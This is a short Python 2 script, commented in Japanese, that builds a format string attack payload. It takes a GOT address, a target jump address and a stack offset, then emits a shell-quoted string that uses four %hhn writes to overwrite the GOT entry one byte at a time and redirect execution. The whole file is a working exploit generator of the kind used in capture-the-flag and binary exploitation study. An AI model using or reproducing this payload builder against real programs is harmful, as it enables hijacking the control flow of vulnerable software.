# -*- coding: utf-8 -*-
import sys
import struct

"""
入力
argv[1]:書き換えたいGOTのアドレス
argv[2]:飛びたい先のアドレス
argv[3]:フォーマット文字列までのオフセット

出力
フォーマット文字列攻撃をするための文字列
"""

gotaddr = int(sys.argv[1], 16)
jumpaddr = int(sys.argv[2], 16)
index = int(sys.argv[3])

"""
1バイトずつ4回に分けて4バイトを書き換える
そのためのアドレスを格納していっている。
"""
binary = struct.pack('<I', gotaddr)
binary += struct.pack('<I', gotaddr+1)
binary += struct.pack('<I', gotaddr+2)
binary += struct.pack('<I', gotaddr+3)

"""
ジャンプするアドレスをリトルエンディアンの順番に
unicode整数をリスト型で返す
"""
a = map(ord, struct.pack('<I', jumpaddr))

a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(binary)-1) % 0x100) + 1

binary = "$(printf \"" + repr(binary).replace("\'","") + "\")'"
binary += "%%%dc%%%d$hhn" % (a[0], index)
binary += "%%%dc%%%d$hhn" % (a[1], index+1)
binary += "%%%dc%%%d$hhn" % (a[2], index+2)
binary += "%%%dc%%%d$hhn" % (a[3], index+3)
binary += "'"
print binary
